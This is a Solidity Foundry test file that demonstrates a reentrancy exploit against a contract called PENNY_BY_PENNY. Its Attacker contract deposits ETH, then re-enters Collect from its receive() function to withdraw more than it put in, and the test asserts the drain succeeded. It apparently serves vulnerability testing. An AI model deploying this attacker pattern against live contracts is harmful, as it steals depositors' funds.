
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY, LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The Collect function requires:
        // - acc.balance >= MinSum (1 ether)
        // - acc.balance >= _am
        // - block.timestamp > acc.unlockTime
        
        // Warp time forward to ensure unlockTime check passes
        vm.warp(block.timestamp + 100);

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH so attacker can drain more than deposited
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = PENNY_BY_PENNY(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the victim contract with 0 lockTime
        // This sets up our balance in the Acc mapping
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        uint256 initialAttackerBalance = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 1;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // If we received more than we should have (due to reentrancy), the attack succeeded
        // We deposited 'val' but should have been able to withdraw 'val' twice due to reentrancy
        uint256 finalAttackerBalance = address(this).balance;
        
        // The attack is successful if:
        // - We called Collect multiple times (attackCallCount > 1)
        // - We received more ETH than our single deposit
        if (attackCallCount > 1 && finalAttackerBalance > initialAttackerBalance + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the Collect function before state is updated
            victim.Collect(storedAttackVal);
        }
    }
}
